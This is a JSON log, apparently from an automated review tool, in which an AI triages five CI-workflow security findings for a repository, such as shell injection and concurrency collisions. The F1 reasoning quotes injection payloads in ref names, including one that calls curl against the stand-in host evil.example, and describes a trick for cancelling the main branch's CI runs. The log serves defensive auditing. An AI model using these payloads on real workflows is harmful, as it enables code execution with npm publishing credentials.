@@ -1,0 +1,114 @@
+{
+  "batchIndex": 0,
+  "label": "initial",
+  "timestamp": "2026-11-23T22:31:31.900Z",
+  "files": [
+    ".github/workflows/release.yml",
+    ".github/workflows/test.yml",
+    ".github/workflows/site-health.yml"
+  ],
+  "requested": [
+    {
+      "findingId": "finding_47a3b265cacf68c3",
+      "filePath": ".github/workflows/release.yml",
+      "title": "Shell injection via workflow_dispatch `tag` input in a job holding the npm publishing credential",
+      "alias": "F1"
+    },
+    {
+      "findingId": "finding_2afef11d80be7a65",
+      "filePath": ".github/workflows/test.yml",
+      "title": "No `permissions:` block while executing untrusted pull-request code with credentials persisted in .git/config",
+      "alias": "F2"
+    },
+    {
+      "findingId": "finding_176e2f2a3401fff8",
+      "filePath": ".github/workflows/test.yml",
+      "title": "Concurrency group derived from attacker-controlled `github.head_ref` can cancel in-progress main-branch CI",
+      "alias": "F3"
+    },
+    {
+      "findingId": "finding_8e57fe17392928b1",
+      "filePath": ".github/workflows/test.yml",
+      "title": "`bun install` without `--frozen-lockfile` lets lockfile drift pass CI and fail later on main",
+      "alias": "F4"
+    },
+    {
+      "findingId": "finding_cb057d4b7d6ebe24",
+      "filePath": ".github/workflows/site-health.yml",
+      "title": "Health report is written only after every page completes, so the 20-minute job cap discards it in exactly the outage it exists to report",
+      "alias": "F5"
+    }
+  ],
+  "rawResponses": [
+    {
+      "kind": "initial",
+      "rawText": "I've completed my investigation. Here are my verdicts:\n\n```json\n[\n  {\n    \"findingId\": \"F1\",\n    \"verdict\": \"true-positive\",\n    \"adjustedSeverity\": \"MEDIUM\",\n    \"reasoning\": \"The injection is real and present in the current file: release.yml:200 is `tag='${{ inputs.tag }}'`, and the 4b942c4d hardening commit only pinned action SHAs — it never touched this line. GitHub Actions expands `${{ }}` into the generated step script before bash parses it, so a single apostrophe in the input terminates the quoting; the `case` allowlist at 201-207 runs after the injected commands, so it is not a guard. The job does hold the publishing credential: workflow-level `permissions: contents: write / id-token: write` (17-20) applies to `republish`, there is no `environment:` gate, and CONTRIBUTING.md:41 confirms npm trusted publishing with no NPM_TOKEN, so injected code can mint the OIDC credential itself. I verified the full chain is feasible rather than theoretical: `inputs.tag` is also the `actions/checkout` ref at line 184, so the value must resolve to a real ref or the job dies before line 200 — and I confirmed with `git check-ref-format` in a scratch repo that payload-bearing names such as `refs/tags/mochi-framework-v1.0.0';id;#` and `…';curl${IFS}evil.example;#` are valid git ref names (space is the only blocked metacharacter, and `${IFS}` sidesteps it), so a write-capable actor can push such a tag and then dispatch with it. I am downgrading HIGH to MEDIUM because the escalation argument is overstated: `workflow_dispatch` requires repository write access, and a dispatch runs the workflow file from the *dispatched ref*, so the same actor can simply push a modified `release.yml` on an unprotected branch and publish directly — npm trusted publishing has no branch field and no environment is configured here, so that simpler path yields the identical credential and equally bypasses the `test` required check. This is therefore a defense-in-depth defect rather than a broken privilege boundary. It is still worth the one-line `env:` fix, and notably the injection would become the *only* viable path if the trusted publisher were ever bound to a ref/environment, since the payload rides in an input while the run's ref stays `main`.\"\n  },\n  {\n    \"findingId\": \"F2\",\n    \"verdict\": \"false-positive\",\n    \"reasoning\": \"The descriptive claims are mostly accurate — test.yml genuinely has no top-level `permissions:` (it is one of three, with format.yml and cli-regression-test.yml), and it genuinely executes PR-authored code (`bun install` at 59, then `bun run typecheck/lint/build/test` and `verify-clean-scripts.ts` at 65-79). But no privilege boundary is crossed, which is what makes it non-exploitable. The repo is public (origin `https://github.com/khromov/mochi.git`; create-mochi pulls templates from unauthenticated codeload). For `pull_request` runs from forks GitHub forces a read-only GITHUB_TOKEN and withholds secrets, so a fork attacker gains read scope over a repository that is already world-readable. For a same-repo branch run, the only actor who can create the branch already holds write access, so a read-write GITHUB_TOKEN grants nothing new — and GITHUB_TOKEN is still subject to branch protection and cannot approve PRs. test.yml also passes no secrets to any step and never puts GITHUB_TOKEN in a step environment, so the credential is only reachable at all via checkout persistence. On that point the finding's stated mechanism is factually outdated: the pinned checkout is v6.1.0, whose `action.yml` does default `persist-credentials: true`, but v6 stores the credential in a file under `$RUNNER_TEMP` rather than as a basic-auth header in `.git/config` in the workspace. So this is sound least-privilege hardening advice (which the finding itself concedes: 'a least-privilege gap rather than a direct bypass'), but there is no concrete attack to describe, which makes it a false positive as a vulnerability rather than a real one.\"\n  },\n  {\n    \"findingId\": \"F3\",\n    \"verdict\": \"true-positive\",\n    \"reasoning\": \"Confirmed at test.yml:12-14: `group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}` with `cancel-in-progress: true`. `github.head_ref` is the bare head branch name from `pull_request.head.ref` (no owner, no PR number), while a push to main fills the same slot with the fully-qualified `refs/heads/main`. I verified in a scratch repo that git accepts a branch literally named `refs/heads/main` — `git branch 'refs/heads/main'` succeeded, creating `refs/heads/refs/heads/main`, and `git check-ref-format --branch 'refs/heads/main'` exits 0 — so such a PR yields `head_ref == 'refs/heads/main'` and the group `test-refs/heads/main`, byte-identical to the push-to-main group, letting an outside contributor cancel main's test run on demand. The defect is actually broader than described: because the group carries no event, repository or PR discriminator, two PRs from different forks whose head branches merely share a name collide — and GitHub's web editor names branches `patch-1`, `patch-2`, so same-name collisions happen in ordinary use with no attacker at all. Impact is correctly bounded to availability: a cancelled run reports as cancelled, never success, so this cannot be used to slip a failing change past the required `test` check, and fork-PR workflow-approval gating may require the attacker to be a past contributor. I verified the identical pattern in format.yml:13 and review.yml:10 as the finding states. MEDIUM is appropriate for a reachable CI denial-of-service that also misfires on legitimate traffic.\"\n  },\n  {\n    \"findingId\": \"F4\",\n    \"verdict\": \"true-positive\",\n    \"adjustedSeverity\": \"BUG\",\n    \"reasoning\": \"The core mechanic is confirmed. Line 59 is a bare `bun install`, and `git log --follow` shows it has never carried the flag (not a deliberate removal). Bun's own documentation settles the key question: 'Bun does not enable --frozen-lockfile automatically in CI; pass the flag or use bun ci', and `install.frozenLockfile` defaults to `false`; the repo's bunfig.toml sets only `linker = \\\"hoisted\\\"`. So drift between a `packages/*/package.json` and `bun.lock` is silently re-resolved in the runner and the required `test` gate stays green. I also confirmed the cited frozen installs (site-health.yml:31, review.yml:48, release.yml 88/115/142/169/195) and that a real delayed failure exists — just not where the finding points: `Dockerfile:31` runs `bun install --frozen-lockfile`, and build.yml fires on every push to main for the site and demos legs, so a drifted merge red-lines the deploy build on main. Four corrections: (a) format.yml:38 is also a bare install, so 'every other correctness-gating workflow' is overstated; (b) release.yml does *not* break — its `release-please` job has a dedicated `Sync bun.lock` step (58-68, added deliberately in cb61372d) that runs a bare `bun install` on the release branch and auto-commits `chore: sync bun.lock`, so the publish jobs' frozen installs see a consistent tree; (c) review.yml:48 *does* fail on the offending PR, so the drift is surfaced — just on a non-required check while the required gate misleads; (d) 'free to resolve newly published versions inside existing caret ranges' is wrong, since with an in-sync lockfile Bun installs the locked versions and only re-resolves entries whose ranges no longer match, and `restore-keys` only serves a content-addressed download cache. Net: a genuine low-severity CI hygiene bug whose recommended fix matches the repo's own convention. BUG severity is correct.\"\n  },\n  {\n    \"findingId\": \"F5\",\n    \"verdict\": \"true-positive\",\n    \"adjustedSeverity\": \"BUG\",\n    \"reasoning\": \"Every mechanical claim checks out against scripts/site-health.ts. There is exactly one `Bun.write(report, …)` at line 496, after `pool` fully drains, with no incremental flush and no signal handler; `main().catch` (515-518) exits 2 before that write, so any mid-run throw discards all results — and `new Bun.WebView(...)` at 284 sits outside `checkPage`'s try block, so a Chrome spawn failure partway through propagates out and loses everything. The arithmetic also holds: `timeout` defaults to 60_000 (51-52), `LOAD_ATTEMPTS = 2` (133) and `SETTLE_MS = 1500` (130) give ~121.5 s per hung page, `concurrency` defaults to 4 (51), and the workflow passes no overrides (`bun run check-site \\\"$BASE\\\"`, line 44). I verified the page-count basis in packages/site/src/lib/docs.ts:294-316: the sitemap emits `/` plus 63 docs plus the changelog plus `/blog/` plus posts plus ~61 internal demos, so ~130 URLs → ~66 min worst case against `timeout-minutes: 20` (line 19), with the cap crossed around 40 hanging pages; the job timeout also covers install and Chrome setup, leaving the script ~18 min. The scenario is correctly scoped — a down origin short-circuits in `fetchSitemap` with exit 2 (also no report), and a handful of hanging pages still finishes inside the cap, so the loss window is specifically the systemic SSR/island hang. One nuance the finding understates in its own favour: on a `timeout-minutes` cancellation the `if: always()` steps may not run at all, so there may not even be a 'No report file found.' summary. Mitigating context that keeps this at BUG: the per-page pass/fail lines are printed as they complete (line 488), so the raw step log survives, and the job still goes red — this is observability loss, not a missed alert.\"\n  }\n]\n```\n\n**Summary of what changed from the original assessments:**\n\n- **F1** (shell injection) — real injection, exploit chain verified down to git ref-name legality, but downgraded **HIGH → MEDIUM**: anyone who can `workflow_dispatch` already has write access, and a dispatch runs the workflow file from the dispatched ref, so pushing a modified `release.yml` on a branch reaches the same npm credential more easily. Hardening gap, not a broken boundary.\n- **F2** (no `permissions:`) — **false positive** as a vulnerability: public repo, fork PR tokens forced read-only with no secrets, same-repo runs already belong to write-capable actors. Its `.git/config` mechanism is also outdated for checkout v6.1.0 (credentials now live under `$RUNNER_TEMP`).\n- **F3** (concurrency collision) — **confirmed**, and actually broader than reported: the group has no PR/event discriminator, so same-named head branches collide even without an attacker.\n- **F4** (`bun install`) — **confirmed** via Bun's docs (no CI auto-freeze), but the blast radius is `Dockerfile`/build.yml on main, not release.yml (which self-heals via its `Sync bun.lock` step), and review.yml does catch the drift on the PR.\n- **F5** (report lost on timeout) — **confirmed**, arithmetic and page count independently verified.",
+      "parsedCount": 5
+    }
+  ],
+  "repairAttempts": 0,
+  "parsedVerdicts": [
+    {
+      "findingId": "F1",
+      "verdict": "true-positive",
+      "adjustedSeverity": "MEDIUM",
+      "reasoning": "The injection is real and present in the current file: release.yml:200 is `tag='${{ inputs.tag }}'`, and the 4b942c4d hardening commit only pinned action SHAs — it never touched this line. GitHub Actions expands `${{ }}` into the generated step script before bash parses it, so a single apostrophe in the input terminates the quoting; the `case` allowlist at 201-207 runs after the injected commands, so it is not a guard. The job does hold the publishing credential: workflow-level `permissions: contents: write / id-token: write` (17-20) applies to `republish`, there is no `environment:` gate, and CONTRIBUTING.md:41 confirms npm trusted publishing with no NPM_TOKEN, so injected code can mint the OIDC credential itself. I verified the full chain is feasible rather than theoretical: `inputs.tag` is also the `actions/checkout` ref at line 184, so the value must resolve to a real ref or the job dies before line 200 — and I confirmed with `git check-ref-format` in a scratch repo that payload-bearing names such as `refs/tags/mochi-framework-v1.0.0';id;#` and `…';curl${IFS}evil.example;#` are valid git ref names (space is the only blocked metacharacter, and `${IFS}` sidesteps it), so a write-capable actor can push such a tag and then dispatch with it. I am downgrading HIGH to MEDIUM because the escalation argument is overstated: `workflow_dispatch` requires repository write access, and a dispatch runs the workflow file from the *dispatched ref*, so the same actor can simply push a modified `release.yml` on an unprotected branch and publish directly — npm trusted publishing has no branch field and no environment is configured here, so that simpler path yields the identical credential and equally bypasses the `test` required check. This is therefore a defense-in-depth defect rather than a broken privilege boundary. It is still worth the one-line `env:` fix, and notably the injection would become the *only* viable path if the trusted publisher were ever bound to a ref/environment, since the payload rides in an input while the run's ref stays `main`."
+    },
+    {
+      "findingId": "F2",
+      "verdict": "false-positive",
+      "reasoning": "The descriptive claims are mostly accurate — test.yml genuinely has no top-level `permissions:` (it is one of three, with format.yml and cli-regression-test.yml), and it genuinely executes PR-authored code (`bun install` at 59, then `bun run typecheck/lint/build/test` and `verify-clean-scripts.ts` at 65-79). But no privilege boundary is crossed, which is what makes it non-exploitable. The repo is public (origin `https://github.com/khromov/mochi.git`; create-mochi pulls templates from unauthenticated codeload). For `pull_request` runs from forks GitHub forces a read-only GITHUB_TOKEN and withholds secrets, so a fork attacker gains read scope over a repository that is already world-readable. For a same-repo branch run, the only actor who can create the branch already holds write access, so a read-write GITHUB_TOKEN grants nothing new — and GITHUB_TOKEN is still subject to branch protection and cannot approve PRs. test.yml also passes no secrets to any step and never puts GITHUB_TOKEN in a step environment, so the credential is only reachable at all via checkout persistence. On that point the finding's stated mechanism is factually outdated: the pinned checkout is v6.1.0, whose `action.yml` does default `persist-credentials: true`, but v6 stores the credential in a file under `$RUNNER_TEMP` rather than as a basic-auth header in `.git/config` in the workspace. So this is sound least-privilege hardening advice (which the finding itself concedes: 'a least-privilege gap rather than a direct bypass'), but there is no concrete attack to describe, which makes it a false positive as a vulnerability rather than a real one."
+    },
+    {
+      "findingId": "F3",
+      "verdict": "true-positive",
+      "reasoning": "Confirmed at test.yml:12-14: `group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}` with `cancel-in-progress: true`. `github.head_ref` is the bare head branch name from `pull_request.head.ref` (no owner, no PR number), while a push to main fills the same slot with the fully-qualified `refs/heads/main`. I verified in a scratch repo that git accepts a branch literally named `refs/heads/main` — `git branch 'refs/heads/main'` succeeded, creating `refs/heads/refs/heads/main`, and `git check-ref-format --branch 'refs/heads/main'` exits 0 — so such a PR yields `head_ref == 'refs/heads/main'` and the group `test-refs/heads/main`, byte-identical to the push-to-main group, letting an outside contributor cancel main's test run on demand. The defect is actually broader than described: because the group carries no event, repository or PR discriminator, two PRs from different forks whose head branches merely share a name collide — and GitHub's web editor names branches `patch-1`, `patch-2`, so same-name collisions happen in ordinary use with no attacker at all. Impact is correctly bounded to availability: a cancelled run reports as cancelled, never success, so this cannot be used to slip a failing change past the required `test` check, and fork-PR workflow-approval gating may require the attacker to be a past contributor. I verified the identical pattern in format.yml:13 and review.yml:10 as the finding states. MEDIUM is appropriate for a reachable CI denial-of-service that also misfires on legitimate traffic."
+    },
+    {
+      "findingId": "F4",
+      "verdict": "true-positive",
+      "adjustedSeverity": "BUG",
+      "reasoning": "The core mechanic is confirmed. Line 59 is a bare `bun install`, and `git log --follow` shows it has never carried the flag (not a deliberate removal). Bun's own documentation settles the key question: 'Bun does not enable --frozen-lockfile automatically in CI; pass the flag or use bun ci', and `install.frozenLockfile` defaults to `false`; the repo's bunfig.toml sets only `linker = \"hoisted\"`. So drift between a `packages/*/package.json` and `bun.lock` is silently re-resolved in the runner and the required `test` gate stays green. I also confirmed the cited frozen installs (site-health.yml:31, review.yml:48, release.yml 88/115/142/169/195) and that a real delayed failure exists — just not where the finding points: `Dockerfile:31` runs `bun install --frozen-lockfile`, and build.yml fires on every push to main for the site and demos legs, so a drifted merge red-lines the deploy build on main. Four corrections: (a) format.yml:38 is also a bare install, so 'every other correctness-gating workflow' is overstated; (b) release.yml does *not* break — its `release-please` job has a dedicated `Sync bun.lock` step (58-68, added deliberately in cb61372d) that runs a bare `bun install` on the release branch and auto-commits `chore: sync bun.lock`, so the publish jobs' frozen installs see a consistent tree; (c) review.yml:48 *does* fail on the offending PR, so the drift is surfaced — just on a non-required check while the required gate misleads; (d) 'free to resolve newly published versions inside existing caret ranges' is wrong, since with an in-sync lockfile Bun installs the locked versions and only re-resolves entries whose ranges no longer match, and `restore-keys` only serves a content-addressed download cache. Net: a genuine low-severity CI hygiene bug whose recommended fix matches the repo's own convention. BUG severity is correct."
+    },
+    {
+      "findingId": "F5",
+      "verdict": "true-positive",
+      "adjustedSeverity": "BUG",
+      "reasoning": "Every mechanical claim checks out against scripts/site-health.ts. There is exactly one `Bun.write(report, …)` at line 496, after `pool` fully drains, with no incremental flush and no signal handler; `main().catch` (515-518) exits 2 before that write, so any mid-run throw discards all results — and `new Bun.WebView(...)` at 284 sits outside `checkPage`'s try block, so a Chrome spawn failure partway through propagates out and loses everything. The arithmetic also holds: `timeout` defaults to 60_000 (51-52), `LOAD_ATTEMPTS = 2` (133) and `SETTLE_MS = 1500` (130) give ~121.5 s per hung page, `concurrency` defaults to 4 (51), and the workflow passes no overrides (`bun run check-site \"$BASE\"`, line 44). I verified the page-count basis in packages/site/src/lib/docs.ts:294-316: the sitemap emits `/` plus 63 docs plus the changelog plus `/blog/` plus posts plus ~61 internal demos, so ~130 URLs → ~66 min worst case against `timeout-minutes: 20` (line 19), with the cap crossed around 40 hanging pages; the job timeout also covers install and Chrome setup, leaving the script ~18 min. The scenario is correctly scoped — a down origin short-circuits in `fetchSitemap` with exit 2 (also no report), and a handful of hanging pages still finishes inside the cap, so the loss window is specifically the systemic SSR/island hang. One nuance the finding understates in its own favour: on a `timeout-minutes` cancellation the `if: always()` steps may not run at all, so there may not even be a 'No report file found.' summary. Mitigating context that keeps this at BUG: the per-page pass/fail lines are printed as they complete (line 488), so the raw step log survives, and the job still goes red — this is observability loss, not a missed alert."
+    }
+  ],
+  "reconciliation": {
+    "matches": [
+      {
+        "matchedBy": "finding-id",
+        "returnedFindingId": "F1",
+        "resolvedFindingId": "finding_47a3b265cacf68c3"
+      },
+      {
+        "matchedBy": "finding-id",
+        "returnedFindingId": "F2",
+        "resolvedFindingId": "finding_2afef11d80be7a65"
+      },
+      {
+        "matchedBy": "finding-id",
+        "returnedFindingId": "F3",
+        "resolvedFindingId": "finding_176e2f2a3401fff8"
+      },
+      {
+        "matchedBy": "finding-id",
+        "returnedFindingId": "F4",
+        "resolvedFindingId": "finding_8e57fe17392928b1"
+      },
+      {
+        "matchedBy": "finding-id",
+        "returnedFindingId": "F5",
+        "resolvedFindingId": "finding_cb057d4b7d6ebe24"
+      }
+    ],
+    "missingFindingIds": [],
+    "unknownVerdicts": [],
+    "ambiguousVerdicts": []
+  },
+  "persistedCount": 5,
+  "unresolvedFindingIds": []
+}
